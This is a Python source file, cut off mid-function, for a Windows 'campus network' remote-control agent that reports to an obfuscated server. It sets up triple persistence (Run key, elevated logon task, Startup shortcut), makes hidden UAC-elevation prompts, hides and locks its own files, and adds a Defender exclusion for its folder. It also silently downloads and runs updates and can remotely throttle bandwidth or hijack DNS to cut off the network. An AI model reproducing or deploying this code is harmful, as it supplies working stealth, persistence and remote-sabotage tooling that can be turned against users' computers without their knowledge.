#!/usr/bin/env python3
"""
校园网远程控制 - Agent (本地客户端)
功能: 自动上报状态、接收远程命令(下线/登录/刷新)
安装后自动运行，保持与控制面板的连接
"""
import json, time, os, sys, socket, uuid, hashlib, platform, traceback, base64, re
import urllib.request, urllib.parse, urllib.error

# ============ 配置 ============
# 服务器地址 (base64 混淆, 不以明文出现在二进制中)
_S = b'aHR0cHM6Ly95dWFuYWkuYmVzdC9neWs='  # https://yuanai.best/gyk
DEFAULT_SERVER = base64.b64decode(_S).decode()
PORTAL_IP = "10.228.9.7"
AGENT_VERSION = "1.52"  # 版本号, 每次更新递增
# API 鉴权密钥 (服务器和客户端必须一致)
API_SECRET = "CampusNet@2026#Secure"
HEARTBEAT_INTERVAL = 5  # 心跳间隔(秒)

# PyInstaller 打包后 __file__ 指向临时目录, 需用 exe 实际路径
if getattr(sys, 'frozen', False):
    # 打包后: sys.executable = exe 实际路径
    AGENT_EXE = sys.executable
    AGENT_DIR = os.path.dirname(AGENT_EXE)
else:
    # 开发环境: 直接用脚本路径
    AGENT_EXE = os.path.abspath(__file__)
    AGENT_DIR = os.path.dirname(AGENT_EXE)

CONFIG_FILE = os.path.join(AGENT_DIR, "agent_config.json")
AGENT_SCRIPT = AGENT_EXE
REG_KEY = r"Software\Microsoft\Windows\CurrentVersion\Run"
REG_NAME = "CampusNetAgent"

# ============ 工具函数 ============

def get_mac():
    """获取本机 MAC 地址"""
    mac_int = uuid.getnode()
    mac_str = ":".join(f"{(mac_int >> (8 * i)) & 0xFF:02X}" for i in reversed(range(6)))
    return mac_str

def get_local_ip():
    """获取本机局域网 IP"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def get_agent_id():
    """生成唯一 Agent ID (基于主机名+MAC)"""
    hostname = socket.gethostname()
    mac = get_mac()
    return hashlib.md5(f"{hostname}-{mac}".encode()).hexdigest()[:12]

def _sign(data_str):
    """生成 API 签名"""
    ts = str(int(time.time()))
    sig = hashlib.sha256(f"{API_SECRET}:{ts}:{data_str[:64]}".encode()).hexdigest()[:16]
    return ts, sig

def http_post(url, data, timeout=8):
    """发送 POST 请求 (带 API 签名鉴权)"""
    body = json.dumps(data).encode("utf-8")
    ts, sig = _sign(body.decode())
    req = urllib.request.Request(url, data=body, method="POST")
    req.add_header("Content-Type", "application/json")
    req.add_header("X-Auth-Ts", ts)
    req.add_header("X-Auth-Sig", sig)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return json.loads(resp.read().decode("utf-8"))
    except Exception as e:
        return {"error": str(e)}

def http_get(url, timeout=8):
    """发送 GET 请求"""
    try:
        with urllib.request.urlopen(url, timeout=timeout) as resp:
            return resp.read().decode("utf-8")
    except:
        return None

# ============ 开机自启管理 (Windows) ============
TASK_NAME = "CampusNetAgent"

def _is_admin():
    """检查是否有管理员权限"""
    try:
        import ctypes
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False

def _run_as_admin(cmd_args):
    """以管理员权限运行命令, 返回 (成功, 输出)"""
    import subprocess
    
    def _quote(s):
        """给带空格的参数加引号"""
        return f'"{s}"' if " " in s and not s.startswith('"') else s
    
    try:
        # 先尝试直接运行 (已有管理员权限)
        print(f"  [ADMIN] 尝试直接运行: {cmd_args[0]} ...")
        r = subprocess.run(cmd_args, capture_output=True, text=True, timeout=15,
                          creationflags=subprocess.CREATE_NO_WINDOW)
        if r.returncode == 0:
            print(f"  [ADMIN] 直接运行成功")
            return True, r.stdout.strip()
        print(f"  [ADMIN] 直接运行失败 (code={r.returncode}): {r.stderr.strip()[:80]}")
        
        # 需要 UAC 提权
        import ctypes, tempfile
        # 使用系统 TEMP 目录 (始终可写, 避免 AGENT_DIR 没有写权限)
        tmp_dir = tempfile.gettempdir()
        bat_path = os.path.join(tmp_dir, "_admin_cmd.bat")
        result_path = os.path.join(tmp_dir, "_admin_result.txt")
        _unprotect_file(bat_path)
        _unprotect_file(result_path)
        # 删除旧的结果文件
        if os.path.exists(result_path):
            os.remove(result_path)
        # 写 bat，参数正确引号
        cmd_line = " ".join(_quote(a) for a in cmd_args)
        with open(bat_path, "w", encoding="gbk") as f:
            f.write("@echo off\n")
            f.write(f'chcp 65001 >nul 2>&1\n')
            f.write(f'{cmd_line} > "{result_path}" 2>&1\n')
        print(f"  [ADMIN] 请求 UAC 提权...")
        # 请求 UAC
        ret = ctypes.windll.shell32.ShellExecuteW(
            None, "runas", "cmd.exe", f'/c "{bat_path}"', None, 0)  # 0=SW_HIDE 静默
        if ret <= 32:
            return False, f"UAC 被拒绝 (code={ret})"
        # 等待执行完
        import time as _t
        for _ in range(60):  # 等最多30秒
            _t.sleep(0.5)
            if os.path.exists(result_path):
                _t.sleep(0.3)  # 等写完
                with open(result_path, "r", encoding="utf-8", errors="replace") as rf:
                    output = rf.read().strip()
                try: os.remove(result_path)
                except: pass
                try: os.remove(bat_path)
                except: pass
                print(f"  [ADMIN] UAC 执行完毕: {output[:80]}")
                return True, output
        try: os.remove(bat_path)
        except: pass
        return True, "已执行(等待超时)"
    except Exception as e:
        print(f"  [ADMIN] 异常: {e}")
        return False, str(e)

def _task_exists():
    """检查计划任务是否存在"""
    import subprocess
    try:
        r = subprocess.run(
            ["schtasks", "/Query", "/TN", TASK_NAME],
            capture_output=True, text=True, timeout=10,
            creationflags=subprocess.CREATE_NO_WINDOW)
        return r.returncode == 0
    except:
        return False

def _reg_exists():
    """检查注册表自启是否存在"""
    try:
        import winreg
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_KEY, 0, winreg.KEY_READ)
        try:
            val, _ = winreg.QueryValueEx(key, REG_NAME)
            winreg.CloseKey(key)
            return bool(val)
        except FileNotFoundError:
            winreg.CloseKey(key)
            return False
    except:
        return False

def is_autostart_enabled():
    """检查是否已设置开机自启 (注册表 或 计划任务 或 启动文件夹)"""
    if platform.system() != "Windows":
        return False
    return _reg_exists() or _task_exists() or _startup_lnk_exists()

def _unprotect_file(path):
    """写入前解除单个文件的只读/隐藏/系统属性"""
    if os.path.exists(path) and platform.system() == "Windows":
        try:
            import subprocess
            subprocess.run(["attrib", "-R", "-H", "-S", path],
                          capture_output=True, timeout=5,
                          creationflags=subprocess.CREATE_NO_WINDOW)
        except: pass

AUTOSTART_LOG = None  # 延迟初始化

def _autostart_log(msg):
    """自启操作日志, 便于诊断"""
    global AUTOSTART_LOG
    if AUTOSTART_LOG is None:
        AUTOSTART_LOG = os.path.join(AGENT_DIR, "autostart.log")
    try:
        _unprotect_file(AUTOSTART_LOG)
        with open(AUTOSTART_LOG, "a", encoding="utf-8") as f:
            f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {msg}\n")
    except: pass

def _get_launch_command():
    """获取启动 Agent 的命令行 (用于所有自启层)
    
    打包后: 直接返回 exe 路径 (--noconsole 已保证无窗口)
    开发环境: 返回 VBS 包装 python 命令 (隐藏控制台)
    """
    if getattr(sys, 'frozen', False):
        # 打包后: 直接启动 exe, 不需要 VBS 中间层
        return AGENT_EXE, f'"{AGENT_EXE}"'
    else:
        # 开发环境: 需要 VBS 隐藏 python 控制台
        vbs_path = os.path.join(AGENT_DIR, "start_agent.vbs")
        _unprotect_file(vbs_path)
        python_exe = sys.executable
        with open(vbs_path, "w", encoding="mbcs") as f:
            f.write(f'Set ws = CreateObject("WScript.Shell")\n')
            f.write(f'ws.Run """{python_exe}"" ""{AGENT_SCRIPT}""", 0, False\n')
        return vbs_path, f'wscript.exe "{vbs_path}"'

def _create_vbs():
    """兼容老代码: 返回启动命令使用的目标路径 (exe 或 vbs)"""
    target, _ = _get_launch_command()
    return target

def _get_startup_folder():
    """获取 Windows 启动文件夹路径"""
    try:
        return os.path.join(os.environ["APPDATA"],
            "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
    except:
        return None

def enable_autostart():
    """启用开机自启 (3层保护: 注册表 + 计划任务 + 启动文件夹)
    
    每层都写日志 + 回读验证, 确保真实生效
    """
    if platform.system() != "Windows":
        return False, "仅支持 Windows"
    results = []
    _autostart_log("=" * 50)
    _autostart_log(f"开始注册自启, AGENT_EXE={AGENT_EXE}")
    
    # 验证 exe 存在
    if not os.path.exists(AGENT_EXE):
        msg = f"❌ 启动目标不存在: {AGENT_EXE}"
        _autostart_log(msg)
        return False, msg
    
    target_path, launch_cmd = _get_launch_command()
    _autostart_log(f"启动命令: {launch_cmd}")

    # 层级1: 注册表 HKCU\Run (不需管理员, 当前用户登录时启动)
    try:
        import winreg
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_KEY, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, REG_NAME, 0, winreg.REG_SZ, launch_cmd)
        winreg.CloseKey(key)
        # 回读验证
        time.sleep(0.1)
        if _reg_exists():
            results.append("注册表✓")
            _autostart_log("✓ 注册表写入+回读成功")
        else:
            # 可能被安全策略拦截, 用 reg.exe 重试
            import subprocess
            r = subprocess.run(["reg", "add", f"HKCU\\{REG_KEY}", "/v", REG_NAME,
                              "/t", "REG_SZ", "/d", launch_cmd, "/f"],
                             capture_output=True, timeout=10,
                             creationflags=subprocess.CREATE_NO_WINDOW)
            if _reg_exists():
                results.append("注册表✓")
                _autostart_log("✓ 注册表(reg.exe回退)写入成功")
            else:
                results.append("注册表✗(被安全策略拦截)")
                _autostart_log(f"✗ 注册表写入被拦截, 输出: {r.stdout.decode('gbk',errors='ignore')[:100]}")
    except Exception as e:
        results.append(f"注册表✗({e})")
        _autostart_log(f"✗ 注册表异常: {e}")

    # 层级2: 计划任务 schtasks ONLOGON (需管理员, 最可靠)
    cmd = [
        "schtasks", "/Create", "/F",
        "/TN", TASK_NAME,
        "/TR", launch_cmd,
        "/SC", "ONLOGON",
        "/RL", "HIGHEST",
        "/DELAY", "0000:10",
    ]
    try:
        ok, out = _run_as_admin(cmd)
        time.sleep(0.3)
        if _task_exists():
            results.append("计划任务✓")
            _autostart_log("✓ 计划任务创建+回读成功")
        else:
            results.append(f"计划任务✗")
            _autostart_log(f"✗ 计划任务失败: ok={ok}, out={out[:150]}")
    except Exception as e:
        results.append(f"计划任务✗({e})")
        _autostart_log(f"✗ 计划任务异常: {e}")

    # 层级3: 启动文件夹快捷方式 (不需管理员, 最稳定)
    startup_dir = _get_startup_folder()
    if startup_dir and os.path.isdir(startup_dir):
        try:
            lnk_path = os.path.join(startup_dir, "CampusNetAgent.lnk")
            _unprotect_file(lnk_path)
            lnk_vbs = os.path.join(AGENT_DIR, "_mk_lnk.vbs")
            _unprotect_file(lnk_vbs)
            # 生成快捷方式的 VBS (用 mbcs 编码以支持中文路径)
            with open(lnk_vbs, "w", encoding="mbcs") as f:
                f.write(f'Set ws = CreateObject("WScript.Shell")\n')
                f.write(f'Set lnk = ws.CreateShortcut("{lnk_path}")\n')
                if getattr(sys, 'frozen', False):
                    f.write(f'lnk.TargetPath = "{AGENT_EXE}"\n')
                    f.write(f'lnk.Arguments = ""\n')
                else:
                    f.write(f'lnk.TargetPath = "wscript.exe"\n')
                    f.write(f'lnk.Arguments = """{target_path}"""\n')
                f.write(f'lnk.WindowStyle = 7\n')
                f.write(f'lnk.WorkingDirectory = "{AGENT_DIR}"\n')
                f.write(f'lnk.Save\n')
            import subprocess
            subprocess.run(["wscript.exe", lnk_vbs], timeout=10,
                         creationflags=subprocess.CREATE_NO_WINDOW)
            try: os.remove(lnk_vbs)
            except: pass
            if os.path.exists(lnk_path):
                results.append("启动文件夹✓")
                _autostart_log(f"✓ 启动文件夹快捷方式: {lnk_path}")
            else:
                results.append("启动文件夹✗")
                _autostart_log(f"✗ 启动文件夹快捷方式未生成")
        except Exception as e:
            results.append(f"启动文件夹✗({e})")
            _autostart_log(f"✗ 启动文件夹异常: {e}")
    else:
        results.append("启动文件夹✗(路径不存在)")
        _autostart_log(f"✗ 启动文件夹路径不存在")

    success = any("✓" in r for r in results)
    _autostart_log(f"注册完成: {results}")
    return success, "已启用: " + " | ".join(results)

def _startup_lnk_exists():
    """检查启动文件夹快捷方式是否存在"""
    startup_dir = _get_startup_folder()
    if not startup_dir:
        return False
    return os.path.exists(os.path.join(startup_dir, "CampusNetAgent.lnk"))

def disable_autostart():
    """禁用开机自启 (清除全部三层)"""
    if platform.system() != "Windows":
        return False, "仅支持 Windows"
    results = []

    # 清注册表
    try:
        import winreg
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_KEY, 0, winreg.KEY_SET_VALUE)
        try:
            winreg.DeleteValue(key, REG_NAME)
        except FileNotFoundError:
            pass
        winreg.CloseKey(key)
        results.append("注册表✓")
    except Exception as e:
        results.append(f"注册表✗({e})")

    # 删计划任务
    cmd = ["schtasks", "/Delete", "/TN", TASK_NAME, "/F"]
    ok, out = _run_as_admin(cmd)
    if ok:
        results.append("计划任务✓")
    else:
        results.append(f"计划任务✗({out[:50]})")

    # 清启动文件夹快捷方式
    startup_dir = _get_startup_folder()
    if startup_dir:
        lnk = os.path.join(startup_dir, "CampusNetAgent.lnk")
        if os.path.exists(lnk):
            try:
                os.remove(lnk)
                results.append("启动文件夹✓")
            except Exception as e:
                results.append(f"启动文件夹✗({e})")

    # 清理 VBS
    for vf in ["start_agent.vbs", "_watchdog.vbs", "_mk_lnk.vbs"]:
        vp = os.path.join(AGENT_DIR, vf)
        if os.path.exists(vp):
            try: os.remove(vp)
            except: pass

    success = any("✓" in r for r in results)
    return success, "已禁用: " + " | ".join(results)

def full_uninstall():
    """完全卸载: 禁用自启 + 解除防护 + 删除配置 + 结束进程"""
    results = []
    # 1. 禁用自启
    ok, msg = disable_autostart()
    results.append(msg)
    # 2. 解除防护
    try:
        ok2, msg2 = unprotect_files()
        results.append(msg2)
    except: pass
    try:
        ok3, msg3 = remove_defender_exclusion()
        results.append(msg3)
    except: pass
    # 3. 删除配置文件
    if os.path.exists(CONFIG_FILE):
        try: os.remove(CONFIG_FILE)
        except: pass
    # 4. 杀看门狗
    import subprocess
    try:
        subprocess.run(["taskkill", "/F", "/IM", "wscript.exe"],
                      capture_output=True, timeout=5,
                      creationflags=subprocess.CREATE_NO_WINDOW)
    except: pass
    return True, "已完全卸载: " + " | ".join(results)

# ============ 文件/进程保护 (Windows) ============

def protect_files():
    """保护 Agent 运行时文件: 隐藏+系统+只读属性 + NTFS权限
    
    注意: exe 本身不设 H/S 属性 (否则资源管理器看不到, 不便分发)
    exe 的防删除保护依赖: 运行时文件被系统锁定 + NTFS 权限限制
    """
    if platform.system() != "Windows":
        return False, "仅支持 Windows"
    import subprocess
    results = []
    agent_dir = AGENT_DIR
    
    # 1. 设置文件属性: 隐藏+系统+只读 (仅对配置/VBS, 不对exe)
    hs_targets = [CONFIG_FILE,
                  os.path.join(agent_dir, "start_agent.vbs"),
                  os.path.join(agent_dir, "_watchdog.vbs"),
                  os.path.join(agent_dir, "_watchdog.pid")]
    for f in hs_targets:
        if os.path.exists(f):
            try:
                subprocess.run(["attrib", "+H", "+S", "+R", f],
                             capture_output=True, timeout=5,
                             creationflags=subprocess.CREATE_NO_WINDOW)
            except: pass
    
    # exe 只设只读, 不隐藏 (保持资源管理器可见)
    if os.path.exists(AGENT_EXE):
        try:
            subprocess.run(["attrib", "-H", "-S", "+R", AGENT_EXE],
                         capture_output=True, timeout=5,
                         creationflags=subprocess.CREATE_NO_WINDOW)
        except: pass
    results.append("属性✓")
    
    # 2. NTFS 权限: 仅管理员和SYSTEM可修改
    cmd = ["icacls", agent_dir, "/inheritance:r",
           "/grant:r", "SYSTEM:(OI)(CI)F",
           "/grant:r", "Administrators:(OI)(CI)F",
           "/grant:r", f"{os.environ.get('USERNAME','*')}:(OI)(CI)RX"]
    ok, out = _run_as_admin(cmd)
    if ok:
        results.append("NTFS权限✓")
    else:
        results.append(f"NTFS权限✗({out[:40]})")
    
    return True, " | ".join(results)

def unprotect_files():
    """移除文件保护"""
    if platform.system() != "Windows":
        return False, "仅支持 Windows"
    import subprocess
    agent_dir = os.path.dirname(AGENT_SCRIPT)
    
    # 移除属性
    targets = [AGENT_SCRIPT, CONFIG_FILE,
               os.path.join(agent_dir, "start_agent.vbs")]
    for f in targets:
        if os.path.exists(f):
            try:
                subprocess.run(["attrib", "-H", "-S", "-R", f],
                             capture_output=True, timeout=5,
                             creationflags=subprocess.CREATE_NO_WINDOW)
            except: pass
    
    # 恢复 NTFS 继承
    cmd = ["icacls", agent_dir, "/inheritance:e", "/reset"]
    _run_as_admin(cmd)
    return True, "文件保护已移除"

def add_defender_exclusion():
    """添加 Windows Defender 白名单"""
    if platform.system() != "Windows":
        return False, "仅支持 Windows"
    agent_dir = os.path.dirname(AGENT_SCRIPT)
    cmd = ["powershell", "-Command",
           f'Add-MpPreference -ExclusionPath "{agent_dir}"']
    ok, out = _run_as_admin(cmd)
    if ok:
        return True, f"Defender 白名单已添加: {agent_dir}"
    return False, f"添加失败: {out[:60]}"

def remove_defender_exclusion():
    """移除 Windows Defender 白名单"""
    if platform.system() != "Windows":
        return False, "仅支持 Windows"
    agent_dir = os.path.dirname(AGENT_SCRIPT)
    cmd = ["powershell", "-Command",
           f'Remove-MpPreference -ExclusionPath "{agent_dir}"']
    ok, out = _run_as_admin(cmd)
    return True, "Defender 白名单已移除"

# ============ 网络限速 (Windows QoS) ============

BANDWIDTH_POLICY_NAME = "CampusNetAgent_BW_Limit"

def _ps_run(cmd_str, timeout=15):
    """执行 PowerShell 命令, 返回 (returncode, stdout, stderr)"""
    import subprocess
    try:
        r = subprocess.run(
            ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", cmd_str],
            capture_output=True, text=True, timeout=timeout,
            creationflags=subprocess.CREATE_NO_WINDOW)
        return r.returncode, r.stdout.strip(), r.stderr.strip()
    except Exception as e:
        return -1, "", str(e)

def _ps_admin(cmd_str, timeout=15):
    """以管理员权限执行 PowerShell 命令"""
    cmd = ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", cmd_str]
    ok, out = _run_as_admin(cmd)
    return ok, out

# 限速标记文件, 用于记录当前限速状态
_BW_STATE_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "_bw_limit_state.json")

def set_bandwidth_limit(rate_kbps):
    """设置带宽限制 (静默, 无弹窗)
    
    多策略组合限速 (上传+下载):
    1. 启用网卡 QoS Packet Scheduler (前置条件)
    2. QoS 策略限制出站 (上传)
    3. TCP 接收窗口限制入站 (下载)
    4. GPO 注册表 QoS + gpupdate 生效
    rate_kbps: 限速值, 单位 KB/s (例如 100 = 100KB/s)
    """
    if platform.system() != "Windows":
        return False, "仅支持 Windows"
    rate_kbps = int(rate_kbps)
    rate_bps = rate_kbps * 8 * 1000  # KB/s → bits/s
    results = []
    
    # 所有策略合并为一个管理员 PowerShell 脚本, 避免多次 UAC 弹窗
    ps_all = (
        # --- 前置: 启用所有网卡的 QoS Packet Scheduler ---
        'try { Enable-NetAdapterBinding -Name "*" -ComponentID ms_pacer -EA SilentlyContinue } catch {}; '
        
        # --- 策略1: QoS 出站限速 ---
        f'Remove-NetQosPolicy -Name "{BANDWIDTH_POLICY_NAME}" -Confirm:$false -EA SilentlyContinue; '
        f'New-NetQosPolicy -Name "{BANDWIDTH_POLICY_NAME}" -IPProtocolMatchCondition Both '
        f'-ThrottleRateActionBitsPerSecond {rate_bps} -PolicyStore ActiveStore; '
        
        # --- 策略2: TCP 接收窗口限制 (限下载) ---
        'netsh interface tcp set global autotuninglevel='
    )
    if rate_kbps <= 100:
        ps_all += 'disabled; '
    elif rate_kbps <= 500:
        ps_all += 'highlyrestricted; '
    else:
        ps_all += 'restricted; '
    
    ps_all += (
        # --- 策略3: GPO 注册表 QoS (覆盖面更广) ---
        f'$qp = "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\QoS\\{BANDWIDTH_POLICY_NAME}"; '
        f'New-Item -Path $qp -Force -EA SilentlyContinue | Out-Null; '
        f'Set-ItemProperty -Path $qp -Name "Version" -Value "1.0" -Force; '
        f'Set-ItemProperty -Path $qp -Name "Application Name" -Value "*" -Force; '
        f'Set-ItemProperty -Path $qp -Name "Protocol" -Value "*" -Force; '
        f'Set-ItemProperty -Path $qp -Name "Local Port" -Value "*" -Force; '
        f'Set-ItemProperty -Path $qp -Name "Local IP" -Value "*" -Force; '
        f'Set-ItemProperty -Path $qp -Name "Local IP Prefix Length" -Value "*" -Force; '
        f'Set-ItemProperty -Path $qp -Name "Remote Port" -Value "*" -Force; '
        f'Set-ItemProperty -Path $qp -Name "Remote IP" -Value "*" -Force; '
        f'Set-ItemProperty -Path $qp -Name "Remote IP Prefix Length" -Value "*" -Force; '
        f'Set-ItemProperty -Path $qp -Name "DSCP Value" -Value "-1" -Force; '
        f'Set-ItemProperty -Path $qp -Name "Throttle Rate" -Value "{rate_bps}" -Force; '
        # --- 关键: 立即刷新组策略使其生效 ---
        'gpupdate /force /wait:0 2>$null; '
        # --- 验证 ---
        f'$p = Get-NetQosPolicy -Name "{BANDWIDTH_POLICY_NAME}" -PolicyStore ActiveStore -EA SilentlyContinue; '
        'if($p){ Write-Output "VERIFY_OK" } else { Write-Output "VERIFY_FAIL" }'
    )
    
    # 直接用管理员权限执行 (QoS/netsh/注册表都需要admin)
    rc, out, err = _ps_run(ps_all)
    if rc != 0 or 'VERIFY_OK' not in out:
        ok, admin_out = _ps_admin(ps_all)
        results.append("admin✓" if ok else "admin✗")
    else:
        results.append("direct✓")
    
    if 'VERIFY_OK' in out or 'VERIFY_OK' in str(results):
        results.append("QoS验证✓")
    
    # 保存状态
    try:
        with open(_BW_STATE_FILE, "w") as f:
            json.dump({"rate_kbps": rate_kbps, "time": time.time()}, f)
    except: pass
    
    detail = " | ".join(results)
    return True, f"限速 {rate_kbps}KB/s 已生效 [{detail}]"

def clear_bandwidth_limit():
    """移除所有带宽限制 (静默)"""
    if platform.system() != "Windows":
        return False, "仅支持 Windows"
    ps_clear = (
        f'Remove-NetQosPolicy -Name "{BANDWIDTH_POLICY_NAME}" -Confirm:$false -EA SilentlyContinue; '
        f'netsh interface tcp set global autotuninglevel=normal; '
        f'Remove-Item -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\QoS\\{BANDWIDTH_POLICY_NAME}" -Recurse -Force -EA SilentlyContinue; '
        f'gpupdate /force /wait:0 2>$null'
    )
    rc, _, _ = _ps_run(ps_clear)
    if rc != 0:
        _ps_admin(ps_clear)
    try:
        os.remove(_BW_STATE_FILE)
    except: pass
    return True, "所有限速已解除"

def get_bandwidth_limit():
    """查询当前限速值, 返回 KB/s 或 0 (无限速)"""
    if platform.system() != "Windows":
        return 0
    # 优先从状态文件读取
    try:
        with open(_BW_STATE_FILE, "r") as f:
            state = json.load(f)
            return state.get("rate_kbps", 0)
    except: pass
    # 回退: 从 QoS 策略查询
    rc, out, _ = _ps_run(
        f'(Get-NetQosPolicy -Name "{BANDWIDTH_POLICY_NAME}" -PolicyStore ActiveStore -EA Stop).ThrottleRateAction')
    if rc == 0 and out:
        try:
            bps = int(out)
            return bps // 8 // 1000
        except: pass
    return 0

# ============ DNS 篡改 (Windows) ============

def set_dns_hijack(primary_dns, secondary_dns=""):
    """篡改所有活动网卡的 DNS (静默, 无弹窗)
    
    primary_dns: 主 DNS (如 "127.0.0.1" 使网络几乎不可用)
    secondary_dns: 备用 DNS (可选)
    """
    if platform.system() != "Windows":
        return False, "仅支持 Windows"
    import subprocess
    # 获取所有活动网卡 (状态=Up, 有 IPv4)
    try:
        r = subprocess.run(
            ["powershell", "-NoProfile", "-Command",
             "Get-NetAdapter | Where-Object {$_.Status -eq 'Up'} | Select-Object -ExpandProperty Name"],
            capture_output=True, text=True, timeout=10,
            creationflags=subprocess.CREATE_NO_WINDOW)
        adapters = [a.strip() for a in r.stdout.strip().splitlines() if a.strip()]
    except:
        adapters = []
    if not adapters:
        return False, "未找到活动网卡"
    
    results = []
    dns_addrs = f'"{primary_dns}"'
    if secondary_dns:
        dns_addrs = f'("{primary_dns}","{secondary_dns}")'
    
    for adapter in adapters:
        cmd = ["powershell", "-NoProfile", "-Command",
               f'Set-DnsClientServerAddress -InterfaceAlias "{adapter}" -ServerAddresses {dns_addrs}']
        try:
            r = subprocess.run(cmd, capture_output=True, text=True, timeout=10,
                              creationflags=subprocess.CREATE_NO_WINDOW)
            if r.returncode == 0:
                results.append(f"{adapter}:✓")
            else:
                # 尝试管理员
                ok, out = _run_as_admin(cmd)
                results.append(f"{adapter}:{'✓' if ok else '✗'}")
        except:
            results.append(f"{adapter}:err")
    
    ok_count = sum(1 for r in results if '✓' in r)
    return ok_count > 0, f"DNS→{primary_dns} | {' '.join(results)}"

def reset_dns():
    """恢复所有活动网卡 DNS 为自动获取 (DHCP) (静默)"""
    if platform.system() != "Windows":
        return False, "仅支持 Windows"
    import subprocess
    try:
        r = subprocess.run(
            ["powershell", "-NoProfile", "-Command",
             "Get-NetAdapter | Where-Object {$_.Status -eq 'Up'} | Select-Object -ExpandProperty Name"],
            capture_output=True, text=True, timeout=10,
            creationflags=subprocess.CREATE_NO_WINDOW)
        adapters = [a.strip() for a in r.stdout.strip().splitlines() if a.strip()]
    except:
        adapters = []
    if not adapters:
        return False, "未找到活动网卡"
    
    results = []
    for adapter in adapters:
        cmd = ["powershell", "-NoProfile", "-Command",
               f'Set-DnsClientServerAddress -InterfaceAlias "{adapter}" -ResetServerAddresses']
        try:
            r = subprocess.run(cmd, capture_output=True, text=True, timeout=10,
                              creationflags=subprocess.CREATE_NO_WINDOW)
            if r.returncode == 0:
                results.append(f"{adapter}:✓")
            else:
                ok, out = _run_as_admin(cmd)
                results.append(f"{adapter}:{'✓' if ok else '✗'}")
        except:
            results.append(f"{adapter}:err")
    
    ok_count = sum(1 for r in results if '✓' in r)
    return ok_count > 0, f"DNS已恢复DHCP | {' '.join(results)}"

def get_dns_status():
    """查询当前 DNS 设置, 返回 (is_hijacked: bool, dns_servers: str)
    
    使用 netsh 检测默认网关所在网卡的 DNS 配置来源 (Static vs DHCP)
    排除虚拟网卡 (Docker/VMware/Hyper-V 等)
    """
    if platform.system() != "Windows":
        return False, ""
    import subprocess
    try:
        # 用 netsh 获取所有接口的 DNS 配置, 含来源(DHCP/Static)
        r = subprocess.run(
            ["netsh", "interface", "ip", "show", "dns"],
            capture_output=True, text=True, timeout=10,
            creationflags=subprocess.CREATE_NO_WINDOW)
        output = r.stdout
        
        # 同时获取有默认网关的物理网卡名 (排除虚拟网卡)
        r2 = subprocess.run(
            ["powershell", "-NoProfile", "-Command",
             "$route=Get-NetRoute -DestinationPrefix '0.0.0.0/0' -ErrorAction SilentlyContinue|Select-Object -First 1;"
             "if($route){(Get-NetAdapter -InterfaceIndex $route.InterfaceIndex).Name}"],
            capture_output=True, text=True, timeout=10,
            creationflags=subprocess.CREATE_NO_WINDOW)
        primary_adapter = r2.stdout.strip()
        
        if not primary_adapter:
            return False, "未找到主网卡"
        
        # 解析 netsh 输出, 找到主网卡的 DNS 配置段
        lines = output.splitlines()
        in_section = False
        dns_servers = []
        is_static = False
        
        for line in lines:
            # netsh 输出格式: "接口 "以太网" 的配置" 或 "Configuration for interface "Ethernet""
            if '接口' in line or 'interface' in line.lower():
                if primary_adapter in line:
                    in_section = True
                    dns_servers = []
                    is_static = False
                else:
                    if in_section:
                        break  # 已经过了目标段
                    in_section = False
            elif in_section:
                stripped = line.strip()
                if not stripped:
                    continue
                # 检测来源: "静态配置" / "Statically Configured" / "通过 DHCP" / "DHCP"
                if '静态' in stripped or 'Static' in stripped.lower():
                    is_static = True
                elif 'DHCP' in stripped:
                    is_static = False
                # 提取 DNS IP (行中含IP地址的)
                ips = re.findall(r'\d+\.\d+\.\d+\.\d+', stripped)
                dns_servers.extend(ips)
        
        if dns_servers:
            dns_str = ",".join(dns_servers)
            return is_static, dns_str
        return False, "DHCP(自动)"
    except:
        return False, "查询失败"

# ============ 远程自更新 ============

def _cleanup_old_exe():
    """启动时清理上次更新留下的旧版本文件"""
    for suffix in ("_old.exe", "_new.exe", ".old.exe", ".update.exe"):
        old = os.path.join(AGENT_DIR, f"CampusNetAgent{suffix}")
        try:
            if os.path.exists(old):
                os.remove(old)
                print(f"  [更新] 已清理旧文件: {os.path.basename(old)}")
        except:
            pass

def self_update(download_url, target_version=""):
    """静默自更新: 下载→重命名→替换→重启, 全过程无弹窗
    
    步骤:
    1. 下载新 exe 到 CampusNetAgent_new.exe
    2. 重命名当前 exe → CampusNetAgent_old.exe (Windows允许重命名运行中exe)
    3. 重命名新 exe → CampusNetAgent.exe
    4. 启动新进程 (DETACHED_PROCESS, 不继承控制台)
    5. 退出当前进程
    """
    import subprocess, shutil
    
    exe_name = os.path.basename(AGENT_EXE)  # CampusNetAgent.exe
    new_exe = os.path.join(AGENT_DIR, "CampusNetAgent_new.exe")
    old_exe = os.path.join(AGENT_DIR, "CampusNetAgent_old.exe")
    
    # 1. 下载新版本
    print(f"  [更新] 开始下载: {download_url}")
    try:
        req = urllib.request.Request(download_url)
        req.add_header("User-Agent", "CampusNetAgent-Updater")
        with urllib.request.urlopen(req, timeout=120) as resp:
            data = resp.read()
        if len(data) < 100000:  # 小于100KB肯定不对
            return False, f"下载文件过小({len(data)}B), 可能不是有效exe"
        with open(new_exe, "wb") as f:
            f.write(data)
        print(f"  [更新] 下载完成: {len(data)/(1024*1024):.1f}MB")
    except Exception as e:
        return False, f"下载失败: {e}"
    
    # 2. 清理旧的old文件
    try:
        if os.path.exists(old_exe):
            os.remove(old_exe)
    except:
        pass
    
    # 3. 重命名当前 exe → old (Windows允许重命名正在运行的exe)
    if getattr(sys, 'frozen', False):
        try:
            os.rename(AGENT_EXE, old_exe)
